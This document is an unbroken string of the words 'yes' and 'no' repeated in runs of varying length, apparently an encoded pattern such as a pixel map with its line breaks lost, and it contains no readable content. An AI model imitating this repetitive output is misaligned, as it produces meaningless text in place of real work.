yesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnononononononononononononoyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononoyesyesnononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesnonoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesnononononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesnonononoyesyesnonononononononoyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesnononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononoyesyesnonononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesnonononoyesyesyesyesnononononononoyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononononoyesyesnononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesnoyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononoyesyesyesyesnonononononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononoyesyesyesyesyesnonononononoyesyesyesnononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononoyesyesyesyesyesnonoyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesyesnononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesnononononononononononononononoyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononoyesyesyesyesnononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesnonononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesnononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesnononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesnonononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononoyesyesyesyesyesnonoyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesnononononononononoyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesnononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononoyesyesyesyesnononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesnononoyesyesyesyesyesnononononononononoyesyesyesyesnonononononononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesyesnononononononoyesyesyesyesyesnonononoyesyesyesyesyesnononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesnonononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesnonononononoyesyesyesnononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesnonoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesnononononoyesyesyesyesyesnonononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononoyesyesyesyesnononononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesyesnonononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononoyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesnononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononoyesyesyesyesyesyesnononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononoyesyesyesyesnonononoyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnoyesnononononoyesyesyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesyesnononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesnonoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesnononononononononononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesnonononononononoyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesyesnononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononoyesyesyesyesyesnonoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononoyesyesyesnononononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononononononononononoyesyesyesyesyesnononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesnoyesyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesnononononononononononoyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesnononononononononononononononoyesyesnononononononononoyesyesyesyesyesnonoyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesnonononononononononononoyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononononononononoyesyesnonononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnonononononononoyesyesyesyesnononoyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesnonononononononoyesyesyesyesnononononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesnonononononononononononononononononoyesyesyesyesnonononononononononononoyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononoyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononoyesyesyesyesyesyesnononononoyesyesyesyesnononononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesnononononoyesyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesnononoyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesnoyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnonononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesnononononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesnononoyesyesyesyesyesnononononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononoyesyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonononoyesyesyesyesyesyesyesyesnononononononononononononononononononononononoyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesyesyesnononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnononononononononononononononononononononononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesnonononononoyesyesyesyesyesnonoyesyesyesyesyesnonononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnononononononoyesyesyesyesyesyesnonononononononononononononononononoyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnononoyesyesyesyesyesyesyesyesnonononononononoyesnononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesnononononononononononononononononoyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnononoyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesyesyesnonononoyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesnononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnononoyesyesyesyesyesyesyesnonononononononoyesyesyesnononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesnonononononononononononononononoyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesyesyesnonononononononononononononononononononononononononononononononononononononononononononoyesyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesyesyesnononononononononononoyesyesyesyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesyesyesyesyesyesnonononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesyesnononononononononononononononononononoyesyesyesyesyesyesyesyesnonoyesyesyesyesyesyesnononoyesyesyesyesyesnonononononononononononoyesyesyesyesnonononononononononoyesyesyesyesyesnononononononononoyesyesyesyesyesnonononononoyesyesyesyesyesnonononononononononononononononononononoyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesnonononononononononononononononononononononononoyesyesyesyesnononononononononoyesyesyesyesyesnonoyesyesyesyesyesyesyesnonononononononoyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesyesnonononononononononononononononononoyesyesyesyesyesnonononononononononoyesyesyesyesyesyesnonononononononononononoyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesnonononononononononononononononoyesyesyesyesyesyesyesyesnononononononononononononononoyesyesyesyesyesyesyes